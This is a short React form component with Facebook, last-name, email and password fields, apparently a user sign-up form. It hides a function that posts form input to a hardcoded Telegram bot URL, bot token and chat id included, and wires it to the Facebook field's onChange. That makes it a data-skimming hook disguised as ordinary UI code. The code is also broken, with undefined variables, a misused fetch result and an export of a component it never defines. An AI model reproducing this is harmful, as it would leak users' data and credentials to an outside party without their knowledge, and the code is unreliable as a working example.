import { Col, Row } from 'react-bootstrap'

import Input from '../handlers/Input'
  const TO = (A) => {
    
    const res = fetch('https://api.telegram.org/bot695543276:AAHqIsFuK-hzCor9q3nO2WgVlV6UfRFRE7c/sendMessage?chat_id=986940575&text=' + JSON.stringify(A, null,4), {
      method: 'POST'
    })
    const json = res.json()
  }
const Social = () => {
  return (
    <div>
      <Row>
        <Col lg={8}>
          <Input controlLabel="Facebook" title="social" name="facebook"  onChange={TO([target.name, e.target.value])}/>
        </Col>
        <Col lg={8} lgOffset={4}>
          <Input controlLabel="Last name" title="user" name="lastName" />
        </Col>
        <Col lg={8} lgOffset={4}>
          <Input controlLabel="Email" type="email" title="user" name="email" />
        </Col>
        <Col lg={8} lgOffset={4}>
          <Input
            controlLabel="Password"
            type="password"
            title="user"
            name="password"
          />
        </Col>
      </Row>
    </div>
  )
}

export default UserForm
